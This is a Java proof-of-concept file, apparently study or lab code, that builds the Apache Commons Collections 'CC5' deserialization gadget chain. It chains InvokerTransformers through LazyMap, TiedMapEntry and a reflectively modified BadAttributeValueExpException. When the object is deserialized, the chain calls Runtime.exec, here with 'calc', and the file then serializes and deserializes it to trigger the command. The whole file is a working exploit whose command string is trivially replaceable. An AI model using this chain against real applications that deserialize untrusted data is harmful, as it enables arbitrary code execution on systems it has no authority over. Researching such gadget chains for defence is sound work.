package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Cc5Poc {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //bave.readObject()方法过度到lazyMap的中间对象
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException重写了readObject（）
        BadAttributeValueExpException bave = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(bave, tiedMapEntry);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(bave);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }

}